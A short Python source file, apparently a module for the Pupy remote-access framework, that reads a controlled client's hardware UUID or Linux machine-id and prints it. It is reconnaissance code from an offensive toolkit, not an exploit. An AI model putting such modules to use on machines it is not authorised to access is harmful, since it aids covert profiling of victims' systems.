# -*- coding: utf-8 -*-
from pupylib.PupyModule import *

__class_name__ = "GetHwUuid"

@config(cat="gather")
class GetHwUuid(PupyModule):
    """ Try to get UUID (DMI) or machine-id (dbus/linux) """
    dependencies = {
        'windows': [ 'win32api', 'win32com', 'pythoncom', 'winerror' ],
        'all': [ 'hwuuid' ]
    }

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(
            prog='get_hwuuid',
            description=self.__doc__
        )

    def run(self, args):
        method, uuid = self.client.conn.modules['hwuuid'].get_hw_uuid()
        print '{} ({})'.format(method, uuid)
